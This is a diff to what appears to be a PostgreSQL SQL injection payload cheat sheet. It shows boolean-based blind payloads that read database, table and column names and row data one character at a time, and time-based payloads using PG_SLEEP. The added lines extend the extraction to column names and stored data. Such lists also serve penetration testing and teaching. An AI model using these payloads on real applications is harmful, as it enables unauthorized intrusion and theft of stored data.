@@ -301,6 +301,8 @@ SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELEC
 ' or (SELECT substr(datname,1,1) FROM pg_database LIMIT 1)='p     #database name
 ' AND ASCII(SUBSTRING((SELECT tablename FROM pg_tables WHERE schemaname=public) ORDER BY tablename OFFSET 2 LIMIT 1)::text FROM 2 FOR 1)>90--
 ' or (SELECT substr(tablename,1,1) FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET 1)='p    #table name
+' or (SELECT substr(column_name,1,1) FROM information_schema.columns WHERE table_name='[table_name]' LIMIT 1 OFFSET 1)='p    #column name
+' or (SELECT substr([column_name],1,1) FROM [table_name] LIMIT 1 OFFSET 1)='p    #data
 ---------------------Time-Based---------------------
 ';SELECT PG_SLEEP(5)--
 ' AND 6826=(SELECT 6826 FROM PG_SLEEP(5))--
